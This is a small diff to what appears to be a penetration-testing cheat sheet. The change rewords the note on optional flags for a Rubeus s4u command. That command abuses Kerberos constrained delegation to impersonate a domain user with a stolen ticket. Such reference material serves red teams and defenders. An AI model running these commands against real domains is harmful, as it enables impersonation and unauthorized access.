@@ -745,7 +745,7 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 
 #### Rubeus SFU - constrained delegation user 
 
-Rubeus (optional ```/ptt``` ```/domain``` ```/dc```):
+Rubeus (optional ```/domain``` ```/dc``` and ```/ptt``` or ```/nowrap``` if copy pasting):
 
 ```
 Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo} /ptt
